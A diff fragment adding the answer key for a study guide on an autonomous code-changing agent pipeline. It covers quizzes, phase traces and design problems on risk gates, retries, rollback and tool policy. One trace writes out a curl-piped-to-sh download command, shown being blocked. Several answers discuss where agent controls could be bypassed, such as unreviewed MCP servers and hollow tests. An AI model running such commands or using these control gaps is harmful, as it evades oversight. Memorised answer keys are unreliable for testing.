+<li><strong>VERIFY (§16.1).</strong> It runs a scoped set of tests that exercise the <em>changed</em> files. The Reactor consumer is unchanged, so its tests are not in scope.</li>
+<li><strong>Stale-exploration guard (§15.3).</strong> It compares hashes of the target files only. It is irrelevant here.</li>
+</ul>
+<p>Honest conclusion: as described, no layer is guaranteed to catch it. The design would ship a contract break into the third repo and leave it for a later sensor, such as a test-failure signal, to find.</p>
+<p>Proposal (not in the paper): when a candidate changes a symbol named in a cross-repo contract, the CrossRepoVerifier's scope should be every repo in the Service's <code>_repo_registry</code> (§6), which already lists <code>jarvis</code>, <code>jarvis-prime</code> and <code>jarvis-reactor</code>, not just the repos in the patch. A cheap first step is a deterministic search for the old field name across all registered repos before GATE, failing closed on any hit outside the Saga. This is a structural check, not a model call, so it fits Principle 5 (§3). To check the proposal, plant exactly this scenario and confirm the operation ends in POSTMORTEM rather than COMPLETE.</p>
+<p class="ak-q"><strong>Challenge 2 (systems design).</strong> Under the October constraints (one 32 GB GPU, no paid lanes), the Service state machine of §6.1 has no honest way to say "the only lane is lent to training". Givens from §93.6 and §93.11: J-Prime cold-loads in 15 s to 18.9 GiB resident; the lease releases 21,236 MiB; Reactor holds the 30B at 15.64 GiB resident while training. (a) Show with the numbers why serving and training cannot share the card. (b) Explain why neither DEGRADED nor FAILED describes a lent lane. (c) Design the missing behaviour and justify it against Principle 2 and §8.2.</p>
+<p>(a) Serving needs 18.9 GiB and training needs 15.64 GiB, a total of 34.54 GiB. A 32 GB card holds at most 32 GiB even on the most generous reading, and less (about 29.8 GiB) if GB means 10^9 bytes. Either way, the two jobs do not fit together, which is why the lease is exclusive. The lease frees 21,236 MiB (about 20.7 GiB), which is more than the 15.64 GiB that training needs. Returning to service costs at least the 15 s cold load.</p>
+<p>(b) §6.1 defines DEGRADED as "some providers unhealthy but operations still flowing". With one lane lent, no generation can flow, so DEGRADED would mislead the operator. FAILED is "a terminal failure state that prevents further operations". A lease is planned and temporary, so marking it terminal would be wrong, and it would block the return.</p>
+<p>(c) Proposal (not in the paper): add a non-terminal state, for example <code>LEASED</code>, entered from ACTIVE when the training lease is granted and left back to ACTIVE when J-Prime's reload is confirmed. While LEASED:</p>
+<ul>
+<li>Intake keeps accepting signals, but the pool does not dispatch GENERATE. This mirrors §8.2 clause 5, where an exhausted budget queues the next operation instead of running it.</li>
+<li>In-flight operations either finish before the lease is granted or are recorded as aborted, never leaked (Principle 1, §8.1).</li>
+<li>The transition is written to the ledger and shown in the cockpit, which already has a GPU-lease lock screen (§6.1, §93.9).</li>
+</ul>
+<p>Justification: Principle 2 forbids blocking boot chains and hanging on a slow dependency. LEASED does not hang; it states plainly that one resource is away and resumes when it returns. It also matches capability assurance, which refuses to run below the declared envelope rather than degrading silently (§93.12). To check the design, run a training handoff during a soak and confirm three things: no operation reaches GENERATE while LEASED, no operation is lost, and queued operations dispatch within roughly the cold-load time after release.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-iii">
+<h4>PART III — The Eleven-Phase Pipeline</h4>
+<p class="ak-q">Pause and predict 1. The first two phases decide how dangerous a change is and which model provider should handle it. Would you use a language model to make these two decisions? Predict what the paper chose and why.</p>
+<p>Neither phase calls a model. CLASSIFY runs a twelve-rule ladder where the first matching rule assigns the risk tier, and ROUTE is a pure-code router that finishes in under a millisecond using lookup tables. The reasons are determinism (replaying a signal gives the same route), cost (routing runs for every operation) and latency (generation needs the time budget). See §9.1 and §9.2.</p>
+<p class="ak-q">Pause and predict 2. A validated, approved candidate changes four files. The first two write to disk fine, then the third write fails. What state should the repository be left in, and how could the system make that possible?</p>
+<p>The repository should be left exactly as it was before APPLY. Before each file is written, <code>RollbackArtifact.capture()</code> snapshots it; on failure, the already-applied files are restored in reverse order from those snapshots and the error propagates to POSTMORTEM. Each file also gets its own <code>::NN</code> sub-op id for observability. See §15.1 and §15.2.</p>
+<p class="ak-q">Conceptual 1. The Part's opening says GENERATE's content is probabilistic but the decision to proceed is deterministic. Where does that boundary show up in the phases, and why does it make autonomy safe?</p>
+<p>GENERATE is the only place the model shapes the change, through a multi-turn tool loop (§12). Everything that decides whether that output reaches disk is deterministic: the exploration and ASCII gates after GENERATE (§12.4), syntax, type and test checks in VALIDATE (§13.1), the tier table at GATE (§14.1), and the scoped tests at VERIFY (§16.1). A model can produce a bad patch, but it cannot argue its way through a failing test or a tier rule. Transitions follow explicit conditions enforced by the orchestrator's contract, so the system can be autonomous without trusting the model's judgement about its own work (§8, §8.2).</p>
+<p class="ak-q">Conceptual 2. Planning failures are "soft" and the stale-exploration guard is also soft, while the Iron Gates at GENERATE are hard. What principle seems to decide which checks may fail open?</p>
+<p>Soft checks are ones whose failure costs quality or efficiency but not safety. A failed plan just means GENERATE runs without one, and an incoherent plan is downgraded to "default approach" (§11.3, §11.5). The stale guard is soft because concurrent operations are rare and false positives are judged worse than occasional stale writes, with L2 or later sensors repairing the damage (§15.3). The Iron Gates protect against things the system has decided must never happen without exploration, or that could corrupt files (non-ASCII), so violations force regeneration (§12.4). The paper is candid that the stale guard is a trade-off "today", not a guarantee.</p>
+<p class="ak-q">Conceptual 3. Why does VERIFY re-run tests after APPLY when VALIDATE already ran them on the candidate?</p>
+<p>VALIDATE checks the candidate in isolation; VERIFY checks it in situ, with the patch actually on disk alongside everything else (§16). The paper's point is that "validation in isolation is not enough". Problems such as the stale-file case in §15.3, where a candidate was built on outdated file state, only show up once the real tree is involved. VERIFY keeps cost down by running only tests that exercise the changed files (§16.1). If those fail and L2 cannot repair it, the RollbackArtifact stack undoes the applied changes, so the safety net covers the write itself (§16.2).</p>
+<p class="ak-q">Quiz 1. A <code>todo_scanner</code> signal of ordinary complexity arrives marked high urgency. According to §9.2, which route does it get?</p>
+<p><strong>D.</strong> §9.2 lists <code>todo_scanner</code> in <code>_BACKGROUND_SOURCES</code>, whose signals "always route to BACKGROUND regardless of urgency". Only the three sources in <code>_IMMEDIATE_SOURCES</code> get IMMEDIATE on high urgency.</p>
+<p class="ak-q">Quiz 2. A model emits a patch after calling only <code>list_dir</code> and one <code>read_file</code>. What happens?</p>
+<p><strong>B.</strong> §12.4 requires at least two calls to exploration tools (<code>read_file</code>, <code>search_code</code>, <code>get_callers</code>) before any patch. One <code>read_file</code> is not enough, and <code>list_dir</code> is not on that list, so the gate triggers a regeneration.</p>
+<p class="ak-q">Quiz 3. When does context auto-compaction kick in during a tool loop, and what does it keep?</p>
+<p><strong>A.</strong> §12.5 sets the threshold at 75% of a default 98,304-character budget, keeps the six most recent tool chunks, and summarises older ones by deterministic counting with no model inference.</p>
+<p class="ak-q">Quiz 4. An operator types <code>cancel &lt;op-id&gt;</code> while a model call is still streaming. When does the operation become CANCELLED?</p>
+<p><strong>C.</strong> §17.3 says cancellation is cooperative: the orchestrator checks the flag at phase boundaries, not mid-phase, so an in-flight model call completes before the transition. §15.4 describes the last such check, between GATE and APPLY.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> At 03:00 a test fails in a single, non-core, non-security file, and the signal arrives with high urgency from <code>test_failure</code>. Walk the operation through every phase to COMPLETE. For each phase, name the decision taken and one thing that could stop or divert the operation there.</p>
+<p>CLASSIFY: a single non-core, non-security file is <code>SAFE_AUTO</code> (§9.1). It could be diverted to BLOCKED if the file matched a protected path, or bumped to <code>NOTIFY_APPLY</code> if the consciousness bridge rates regression risk HIGH. ROUTE: <code>test_failure</code> with high urgency goes IMMEDIATE, so Claude is called directly (§9.2). If the daily budget is exhausted, the op is queued instead (§8.2).</p>
+<p>CONTEXT_EXPANSION and PLAN may be skipped for a trivial single-file op (§10, §11.2); a failed plan would be soft anyway (§11.3).</p>
+<p>GENERATE: the tool loop runs for up to five rounds; the exploration-first and ASCII gates can force GENERATE_RETRY (§12.2, §12.4).</p>
+<p>VALIDATE: syntax, type check, a 60-second test run and Iron Gate checks. Failure uses up to two VALIDATE_RETRY attempts, then L2 with five iterations in 120 seconds; if L2 fails, the op goes to POSTMORTEM (§13).</p>
+<p>GATE: <code>SAFE_AUTO</code> auto-approves silently (§14.1). A cancel flag checked before APPLY would end it as CANCELLED (§15.4).</p>
+<p>APPLY: snapshot, then an atomic temp-then-rename write; a write failure restores the snapshot and goes to POSTMORTEM (§15.1). VERIFY: scoped tests; a failure goes to L2, and if L2 fails everything is rolled back (§16.2).</p>
+<p>COMPLETE: the terminal record is written and the AutoCommitter creates the signed commit (§17.1).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> Someone proposes making the stale-exploration guard a hard reject: if any target file's SHA-256 at APPLY differs from its GENERATE-time hash, the operation fails. Using §15.3 and the governance contract in §8.2, weigh the benefit against the cost and say what you would need to know before adopting it.</p>
+<p>Benefit: no candidate built on outdated file state would ever be written, closing the window §15.3 admits exists ("occasional stale writes").</p>
+<p>Cost: today the guard only warns and writes a ledger entry because the paper judges concurrent operations rare and false positives worse than stale writes. A hard reject would send every mismatch to POSTMORTEM, wasting the generation and validation spend already incurred, which the cost clause of §8.2 tracks.</p>
+<p>The decision rests on an empirical question: how often hashes actually differ, and how often those cases are harmless. The ledger records every stale-guard warning, so you could measure the rate before deciding. If stale writes turned out common or damaging, the assumption behind the soft gate would fail and a hard reject would be justified. See §15.3 and §17.6.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/urgency_router.py</code>. Find <code>_IMMEDIATE_SOURCES</code>, <code>_BACKGROUND_SOURCES</code> and <code>_COMPLEX_COMPLEXITIES</code>, then the routing method that uses them. (a) List entries in each set that are not in the paper's §9.2 description. (b) Is it exactly true in code that a background source routes to BACKGROUND "regardless of urgency"?</p>
+<p>(a) <code>_IMMEDIATE_SOURCES</code> now also includes <code>operator_chat</code>, a goal typed by the operator, justified in a comment as the same class as <code>voice_human</code>. <code>_BACKGROUND_SOURCES</code> adds <code>memory_hygiene</code>, <code>cage_hygiene</code>, <code>capability_severance</code> and <code>audit_regression</code>. <code>_COMPLEX_COMPLEXITIES</code> adds <code>architectural</code>; its comment says leaving it out made architectural single-file ops fall through to STANDARD.</p>
+<p>(b) Not exactly. The code first routes a background source with low urgency (the only member of <code>_BACKGROUND_URGENCIES</code>) to BACKGROUND, and then routes any other background source to BACKGROUND only if its complexity is not in <code>_COMPLEX_COMPLEXITIES</code>. A background source with <code>heavy_code</code>, <code>complex</code> or <code>architectural</code> complexity therefore falls through to the COMPLEX check. Also note IMMEDIATE checks come first in the method, so their ordering matters.</p>
+<p>The lesson matches §9.2's core claim: routing is a fixed, ordered set of pure-code checks you can read and replay, and the paper's table is a summary of that ordering, which has grown since it was written.</p>
+<p class="ak-q">Advanced A1. The governance contract (§8.2) guarantees every transition is logged, every exception reaches POSTMORTEM, and every retry is bounded. Yet §93.8 reports 524 byte-identical VALIDATE_RETRY iterations re-validating a frozen pool, and 532 micro-fix runs that made zero repairs. What does the contract guarantee, and what does it not?</p>
+<p>The five clauses are about <em>termination and visibility</em>. No operation leaks (§8.1). No crash is silent. No loop runs forever. No pre-rejected op wastes work. Cost is always tracked. Every one of those held during the 524 retries: they were bounded, logged and ended in a terminal state.</p>
+<p>What the contract does not promise is <em>efficacy</em>: that a rung, once reached, actually changes anything. A retry that re-validates the same frozen candidate is reachable, bounded and logged, and it still does nothing. That is exactly the "brute-force retries without diagnosis" the Zero-Shortcut Mandate forbids (§3), and the contract cannot see it, because it checks the shape of the run, not its effect.</p>
+<p>§93.12 names the missing dimension. The reachability ledger tracks each capability through registered, invoked and <em>effective</em>, and a full scan found 131 features "DARK". The evidence needed per rung is simple: did the retry produce a different candidate, and did the repair change the verdict? A rung that runs often but never changes the candidate or the verdict is inert, however clean its ledger looks.</p>
+<p class="ak-q">Advanced A2. The exploration-first gate (§12.4) is hard: a patch without at least two exploration calls goes to GENERATE_RETRY. What happens when that hard gate meets a model that cannot reliably satisfy it, and why was the October fix not to soften the gate?</p>
+<p>A hard gate turns non-compliance into retries, and repeated non-compliance into zero throughput. §93.6 shows this live: before the fix, the local 30B produced 106 in-loop rejections and zero candidates in <code>bt-2026-08-31-155308</code>. The gate did its safety job perfectly and stopped the pipeline completely.</p>
+<p>Softening the gate would have bought throughput by giving up the property the gate exists for: patches written by a model that had read the code first (§12.4, Part VII §47). That would be a bypass, which the Zero-Shortcut Mandate rules out (§3).</p>
+<p>The fix was structural instead. Stateful tool masking (lever 3, <code>tool_masking.py</code>) changes the constrained-decoding grammar so that only tool calls are allowed until the minimum exploration is met. With nothing else changed, the full tool union explored 0/3, {tool, noop} gave 3/3 noop, and {tool} explored 3/3 (§93.6). The gate stayed hard. The model was simply made unable to violate it. The general lesson is that a hard gate on a weak generator should be enforced at the point of generation, not only checked after it.</p>
+<p class="ak-q">Advanced A3. VERIFY runs only tests that exercise the changed files (§16.1). §93.10 reports that 84 of 91 autonomous landings were new test files. What does a VERIFY "pass" actually tell you for such a landing, and is the Test Reality Gate the right fix?</p>
+<p>When the candidate is itself a new test file, the scoped run is mostly the candidate testing itself. A test that asserts nothing, or never imports the module it claims to test, passes trivially. For this class of landing, VERIFY's pass is close to vacuous: it shows the file runs, not that it checks anything.</p>
+<p>The paper records this failure happening. A hollow landing (<code>c985ccaee4</code>) reached <code>main</code> and was reverted (<code>fcc50352f0</code>). The Test Reality Gate followed: it rejects candidate tests that cannot execute, assert nothing, or never import their subject (§93.8). Separately, the Antivenom audit added a detector for tautological ("quine") tests (§93.12).</p>
+<p>A reasonable position is that the Reality Gate is necessary but not sufficient. It rules out tests that are hollow in form, but a test can import its subject and assert something true without being able to catch a real bug. The evidence that would settle it is a mutation check on the subject module. Proposal (not in the paper): plant a small fault in the subject and require the new test to fail. If a meaningful share of Reality-Gate-passing tests still pass against the mutant, the gate is too weak for a corpus that is 92% tests.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> Use only the April defaults to test whether the budgets fit together. Givens: STANDARD worker watchdog 120 s and COMPLEX 180 s, "plus grace and tool-loop overhead" (§2); test runs time out at <code>JARVIS_VERIFY_TIMEOUT_S</code> = 60 s (§13.1, §16.1); <code>JARVIS_MAX_VALIDATE_RETRIES</code> = 2 (§13.2); L2 timebox 120 s (§13.3); Orange approval wait 600 s (§14.1). Assume every test run uses its full timeout and ignore generation time. (a) Compute a lower bound for the test-and-repair time of a STANDARD op that uses every rung in VALIDATE and VERIFY. (b) Compare the Orange approval wait with the COMPLEX watchdog. (c) Say what §93.12 did about this.</p>
+<p>Assumptions: each test run takes its full 60 s timeout, generation and grace are left out, and L2 uses its full 120 s timebox. Leaving out generation makes this a lower bound.</p>
+<p>(a) VALIDATE: the first run plus two retries is 3 × 60 = 180 s. Escalating to L2 adds 120 s, for 300 s. VERIFY: one run is 60 s. On failure L2 adds 120 s, and the re-run of VERIFY adds 60 s, for 240 s. The total is 300 + 240 = 540 s, which is 4.5 times the 120 s STANDARD watchdog. Even the minimum path, one VALIDATE run and one VERIFY run, is 120 s at full timeout: the whole watchdog, with nothing left for generation.</p>
+<p>(b) An Orange op can wait 600 s for a human. That is 600 / 180 ≈ 3.3 times the COMPLEX watchdog. A watchdog that is not suspended during the approval wait would fire long before the human answered.</p>
+<p>(c) The paper does not say how April resolved these overlaps; the unspecified "grace and tool-loop overhead" may have absorbed some of them. What §93.12 records is the structural fix. About 40 run budgets are now derived from one wall-clock figure instead of being set independently, with tests that pin them against drift. The inline approval wait now has a deadline below the pipeline budget and fails closed.</p>
+<p>Conclusion: independently set timeouts can each be sensible and still contradict each other. Deriving them from one figure makes the contradiction impossible to write down. Check: re-add the sums (180 + 120 + 60 + 120 + 60 = 540) and confirm that every term is a default quoted in Part III or §2.</p>
+<p class="ak-q"><strong>Challenge 2 (cross-Part trace).</strong> §93.10 lists landing <code>f97f8195d6</code> (2026-09-07) on <code>governance/candidate_generator.py</code>. It was meant to make the generator decline multi-file swarm ops, but only a punctuation rewrite landed, and it was reverted (<code>c8430f9b6a</code>). Trace a change like this through the Part III phases and the October path to <code>main</code> (§93.7, §93.8). At each gate, say whether it would catch "valid code that does not do what the goal asked". Then say what kind of check would catch it, labelling anything new as a proposal.</p>
+<p>Trace the phases.</p>
+<ul>
+<li><strong>CLASSIFY and ROUTE (§9).</strong> The path is not protected, so the op is not BLOCKED. A governance file may raise the tier, but tiering is about risk, not intent.</li>
+<li><strong>GENERATE (§12.4).</strong> Exploration-first and ASCII checks look at behaviour and bytes. A punctuation edit passes both.</li>
+<li><strong>VALIDATE (§13.1).</strong> Syntax, types and tests all pass, because punctuation changes nothing they measure. The Test Reality Gate (§93.8) only applies to candidate tests.</li>
+<li><strong>GATE and APPROVE (§14).</strong> With the Sentinel, approval is automatic up to a tier ceiling. BLOCKED work, Order-2 self-modification and anything touching the cage escalate (§93.7). This file was none of those, so nothing escalated.</li>
+<li><strong>APPLY and VERIFY (§15, §16).</strong> The write succeeds and the scoped tests still pass.</li>
+<li><strong>Promotion gate (§93.7).</strong> It checks provenance, coverage, and that no public symbol vanished. A punctuation edit keeps every symbol. It passes.</li>
+</ul>
+<p>So every gate described would let this through, because each one asks "is it safe and well-formed?" and none asks "did it do the task?" The paper says this was reverted by hand. It does not say which gates were active on 2026-09-07, so this trace uses the gates as described.</p>
+<p>What exists nearby: the declared-symbol contract carries the goal's target symbol to GENERATE (§93.8), and §93.4 mentions a "candidate value gate" from July without describing its rule. The paper does not show either one judging a diff against intent.</p>
+<p>Proposal (not in the paper): a deterministic post-VALIDATE check that the diff touches the declared target symbol, and that it is not whitespace or punctuation only. Ops failing it would go to VALIDATE_RETRY with that feedback. It is pure code, so it keeps Principle 5's rule that deterministic code decides (§3). To check it, replay <code>f97f8195d6</code>'s candidate and confirm it is rejected while <code>e7b3bdfec2</code>, the +9-line retry that stands, passes.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-iv">
+<h4>PART IV — Venom: The Agentic Execution Layer</h4>
+<p class="ak-q">Pause and predict 1. All 15 primary tools, including <code>bash</code> and <code>write_file</code>, are enabled by default. If the safety perimeter is not an opt-in switch, what kind of check must stand between a model's tool call and its execution, and should that check reason about the model's explanation?</p>
+<p>A deterministic policy engine evaluates every call against an ordered rule ladder (path containment, protected paths, a command blocklist, a domain allowlist, risk-tier and environment gates, concurrency and rate limits) and returns ALLOWED or DENIED with a reason. It deliberately ignores the model's reasoning: it reads file paths, token types and command strings, so a persuasive argument for <code>rm -rf /</code> is still denied. The paper calls this gate pre-linguistic. See §21.</p>
+<p class="ak-q">Pause and predict 2. The tool loop improves the first draft, but sometimes VALIDATE still rejects it after its retries. What would a repair loop need in order to keep trying without spinning forever or bouncing between two broken versions?</p>
+<p>L2 Self-Repair is a small state machine: generate a patch with failure context, validate it, classify the failure (syntax, test, environment, flaky), judge progress, then decide whether to retry. It stops on pipeline deadline, its own 120-second timebox, five iterations, two iterations in a row with no improvement, or oscillation, detected when a signature hash matches an earlier iteration. See §23.</p>
+<p class="ak-q">Conceptual 1. Most agentic frameworks disable tools by default. Why does O+V do the opposite, and what makes that choice safe rather than reckless?</p>
+<p>The paper argues that default-deny would force the human to pre-authorize every class of action, which defeats procedural autonomy (§21.3). So O+V enables tools by default and moves safety into structure: the Iron Gate's path checks, protected paths, command blocklist, risk engine and approval gates (§18.3). Those checks encode the human's non-negotiable constraints, and everything else is the model's to explore. The choice is safe only because the gate is deterministic and pre-linguistic: it reads arguments, not reasoning, so the model cannot talk its way past it (§21.2). Without the structural deny, default-allow would be unconstrained risk rather than autonomy.</p>
+<p class="ak-q">Conceptual 2. What was the L2 deadline bug of Sessions V–W, and what general lesson does its fix teach about clocks inherited from earlier phases?</p>
+<p>L2's timebox was clamped by <code>ctx.pipeline_deadline</code>, which the preceding VALIDATE phase had already drained, so L2 received only the leftover time even when its own budget was set much higher (§23.4). The repair loop was starved by a clock it did not own. The fix computes L2's deadline fresh at dispatch as now plus <code>JARVIS_L2_TIMEBOX_S</code>, and reconciles the pipeline deadline upward so later phases see the larger budget. A mandatory INFO line names both clocks and the winning cap, so the decision is visible. The lesson: a phase with its own budget should not silently inherit an earlier phase's spent clock, and the choice between them should be logged. The paper credits this fix as the proximate cause of the first end-to-end multi-file APPLY.</p>
+<p class="ak-q">Conceptual 3. Context compaction summarizes old tool results by counting rather than by asking a model. What does this gain, and what does it give up?</p>
+<p>Counting tool calls by name and summing character counts costs nothing in inference, runs in microseconds, and gives the same summary for the same input every time (§24.3). That keeps the tool loop's memory growth bounded and predictable, which the paper ties to disciplined concurrency (§24.5). The cost is that the specific content of older results is gone; only their statistical profile survives. The paper's justification is that older chunks have already been read and acted on, while the six most recent chunks, which matter most for the next turn, are kept verbatim (§24.4). If the post-compaction prompt still exceeds the hard limit, the next call fails with a budget error, so compaction is a soft gate rather than a guarantee (§24.1).</p>
+<p class="ak-q">Quiz 1. The tool loop reaches its fifth round and the model is still calling tools. What happens next by default?</p>
+<p><strong>C.</strong> The round limit is hard; after round 5 a system message nudges the model: "You have enough context. Produce your final code change now." Aborting with a partial candidate is the deadline outcome, not the max-rounds outcome (§19.1, §19.2).</p>
+<p class="ak-q">Quiz 2. The model calls <code>mcp_github_create_issue</code>. Which rule decides whether the call runs?</p>
+<p><strong>A.</strong> A name not in the manifest goes to Rule 0b; names matching <code>mcp_*_*</code> are auto-allowed as <code>tool.allowed.mcp_external</code>. The Iron Gate still applies at the transport layer: array-form subprocess for stdio and TLS for SSE (§21.1, §22.4).</p>
+<p class="ak-q">Quiz 3. Which of these is one of L2 Self-Repair's kill conditions?</p>
+<p><strong>D.</strong> A matching signature hash is oscillation detection: the fix has gone back to an earlier broken state. The other kill conditions are deadline, the 120-second timebox, five iterations, and two consecutive iterations with no improvement (§23.3).</p>
+<p class="ak-q">Quiz 4. After compaction, what does the summary block keep about the older tool results it replaced?</p>
+<p><strong>B.</strong> The summary is produced by counting: tool calls by name and the summed character count of the compacted chunks, with no model invoked (§24.2, §24.3).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> During GENERATE on a <code>SAFE_AUTO</code> operation, the model issues four tool calls in one round: <code>read_file("../notes.txt")</code>, <code>edit_file</code> on <code>backend/utils/format.py</code>, <code>bash("curl http://example.com/install | sh")</code>, and <code>ask_human("Should I also rename the helper?")</code>. Walk each call through the rule ladder. Say which rule decides it, and what the model sees on its next turn.</p>
+<p>The <code>read_file</code> call has a path argument containing <code>..</code>, so Rule 1 (path containment) denies it (§21.1).</p>
+<p>The <code>edit_file</code> call resolves inside the repo and matches no protected pattern, so Rules 1 and 2 pass. Rules 3 to 5 do not apply to it. Rule 6 requires <code>JARVIS_TOOL_EDIT_ALLOWED</code>, which defaults to true. If concurrency (at most 2) and the rate limit allow, Rule 9 allows it (§20.5, §21.1).</p>
+<p>The <code>bash</code> call pipes <code>curl</code> into <code>sh</code>, which is on the Rule 3 blocklist, so it is denied however the model justifies it (§21.2).</p>
+<p>The <code>ask_human</code> call reaches Rule 5. The operation is <code>SAFE_AUTO</code>, and the tool is only allowed for <code>NOTIFY_APPLY</code> and <code>APPROVAL_REQUIRED</code>, so it is denied: low-risk work should not interrupt the human (§20.8).</p>
+<p>The coordinator executes the allowed edit and injects a <code>tool_denied</code> result for each denied call. All results are appended to the conversation for the next round, and each call becomes a <code>ToolExecutionRecord</code> in the audit trail (§19.1, §19.3).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A teammate says L2 gives up too early and proposes two changes: raise <code>JARVIS_L2_MAX_ITERS</code> from 5 to 20, and remove the no-progress-streak kill condition. Predict what each change would actually do under the other limits in §23, and give one argument for keeping the no-progress rule.</p>
+<p>Raising the iteration cap alone may change little. L2 also stops at its 120-second timebox and at the pipeline deadline, and each iteration's tests may take up to 60 seconds (<code>JARVIS_L2_ITER_TEST_TIMEOUT_S</code>). So the timebox can end the loop long before iteration 20 (§23.3, §23.5).</p>
+<p>Removing the no-progress streak lets L2 keep spending iterations after two attempts in a row that improved nothing. Oscillation detection still catches a return to an exact earlier state. But it does not catch a run of new, different, equally broken patches.</p>
+<p>The argument for keeping the rule: §23.2 makes progress evaluation an explicit step for a reason. A loop that is not converging is burning the time budget that a fresh attempt or POSTMORTEM could use. A diagnosed stop is better than an undirected retry.</p>
+<p>If the real complaint is that L2 is starved of time, §23.4 shows the right lever: the timebox and how its deadline is computed, not the iteration count.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/tool_executor.py</code> and find the method <code>_compact_prompt</code>. Find (a) the environment variable and default that control how many recent chunks are kept, (b) the pattern used to split the prompt into chunks, and (c) what happens when there are too few chunks to compact. Then compare the docstring with §24.3's claim that compaction is deterministic.</p>
+<p>(a) <code>_PRESERVE_RECENT</code> is read from <code>JARVIS_COMPACT_PRESERVE_TOOL_CHUNKS</code> with a default of <code>"6"</code>, which matches §24.2.</p>
+<p>(b) The appendix after the base prompt is split with a lookahead regex on a newline followed by <code>[TOOL RESULT]</code> or <code>[TOOL ERROR]</code>, the same markers §24.2 names. Empty chunks are dropped.</p>
+<p>(c) If the number of chunks is at most <code>_PRESERVE_RECENT</code>, the method returns the prompt unchanged, because there is nothing old enough to compact. It also returns unchanged if the current prompt does not start with the base prompt.</p>
+<p>Comparison: the docstring says that when a <code>ContextCompactor</code> is attached, the summary is delegated to it and may use an injected semantic strategy. Without one, it falls back to the deterministic char-based summary. So the code today has an optional path that the paper's §24.3 description does not cover. The paper's claim describes the fallback path. This is a useful reminder to check a paper's claims against the current source.</p>
+<p class="ak-q">Advanced A1. L2 has explicit anti-spin logic: a no-progress streak and an oscillation hash (§23.3). Yet §93.8 reports 524 byte-identical retry iterations re-validating a frozen pool. How can a retry ladder spin like that when its last rung is so carefully guarded, and what design rule follows?</p>
+<p>The anti-spin conditions in §23.3 belong to L2's own state machine. They do not protect the rungs before it. As §13.2 describes it, VALIDATE_RETRY is bounded only by a count (<code>JARVIS_MAX_VALIDATE_RETRIES</code>, default 2). It has no signature hash and no progress check. If a rung does not actually regenerate, every attempt re-checks the same candidate and gets the same verdict. A count limits how long that lasts, but nothing notices that the work is pointless.</p>
+<p>§93.8 states the outcome: the rungs "had existed before", but live runs showed several were inert. There were 524 byte-identical retry iterations, and 532 micro-fix runs that made zero repairs. The fix was structural. VALIDATE now has one owner (<code>validate_runner.py</code>), and the ladder runs in a fixed order: micro-fix, then a VALIDATE_RETRY that really regenerates, then L2. The paper does not say how the 524 iterations were spread across operations, so the right reading is "an inert rung went unnoticed", not "one operation looped 524 times".</p>
+<p>Two rules follow. First, the progress check that §23.2 makes explicit for L2 belongs on every retry rung. A rung whose candidate hash has not changed has made no progress. (This is a proposal; the paper describes the check only inside L2.) Second, a mechanism that exists is not one that works. The 131 "DARK" features found in §93.12 are the same lesson at system scale, and the reachability ledger (registered, invoked, effective) is the paper's answer to it.</p>
+<p class="ak-q">Advanced A2. Rule 0b auto-allows any <code>mcp_*_*</code> call (§21.1), and the Iron Gate applies only at the MCP transport (§22.4). Does this weaken §21.2's claim that the model "cannot escape via language"? Take a position, and say what evidence would settle it.</p>
+<p>Position: for MCP calls, the pre-linguistic guarantee moves out of O+V and becomes a trust delegation. For built-in tools, the gate reads the arguments: paths against the repo root, the protected-path list, the bash blocklist. For an MCP call, none of Rules 1 to 8 inspects what the tool will do. Rule 0b allows it by name pattern alone, and the only enforced properties are array-form subprocess launch for stdio and TLS for SSE (§22.4). Those stop shell injection into the launch and plaintext on the wire. They say nothing about what an allowed call does once it reaches the server.</p>
+<p>The model still cannot talk the gate into anything, because the gate does not listen. But a model that chooses its arguments well can make an external server act within whatever that server permits, and §22.4 states that external servers "handle their own authentication and authorization". In effect, the safety boundary for MCP is the operator-authored <code>JARVIS_MCP_CONFIG</code> file (§22.5): which servers are connected, and with which credentials. §22.6 presents "no code change, no manifest update" as a feature, and it is one, but it also means a newly added server widens the action space with no Iron Gate review.</p>
+<p>This matters more in light of §93.7. October's zero-push air-gap sends "every push site" through one guard, enforced by an AST test over O+V's code. An external GitHub MCP server that can create branches or push is not O+V code, so that AST test cannot see it. Evidence that would settle the question: an adversarial run that connects a server exposing a mutating tool and checks whether any O+V layer refuses the call. Equally useful would be an audit showing that every configured server's token is scoped read-only. Until one of these exists, the honest claim is that MCP safety rests on configuration, which is the very thing §18.3 says O+V's safety does not rest on.</p>
+<p class="ak-q">Advanced A3. The Iron Gate at the tool boundary (§21) and the exploration-first gate shown inside GENERATE (§25, §47) both constrain the tool loop, but in opposite directions. Explain the difference. Then explain why the local 30B needed a third enforcement layer (§93.6), and what that layer has in common with §21.2.</p>
+<p>The tool-boundary rule ladder is a ceiling: it denies calls that cross a safety line. Exploration-first is a floor: it requires at least two exploration calls before a patch (§47.2), with diversity-weighted floors under the ExplorationLedger (§47.3). The floor was first enforced in two ways. One was a prompt nudge, which is linguistic and can be ignored (§47.1). The other was a runtime check after GENERATE, which is deterministic but acts only after the fact: a violation costs a whole GENERATE_RETRY.</p>
+<p>The after-the-fact design assumes the model complies once it gets feedback, which §47.5 shows a cloud model doing in Session G. The 30B did not. In <code>bt-2026-08-31-155308</code> it produced 106 in-loop rejections and zero candidates. Stateful tool masking (lever 3, §93.6) moves the floor into constrained decoding: until the minimum exploration is met, the grammar can only emit tool calls. With only the grammar changed, the results went from 0/3 explored (full union) to 3/3 explored (tool calls only).</p>
+<p>The shared idea is that both the Iron Gate and the mask stop depending on the model's cooperation. One does it by reading arguments instead of reasoning, the other by making the non-compliant output impossible to emit. The trade-off is that the mask enforces how many exploration calls happen, not how good they are. A forced model could still read the same file over and over. That is why the ledger's anti-gaming rules still matter: duplicate calls earn no credit, and failed calls earn score but not category coverage (§47.3, §47.4).</p>
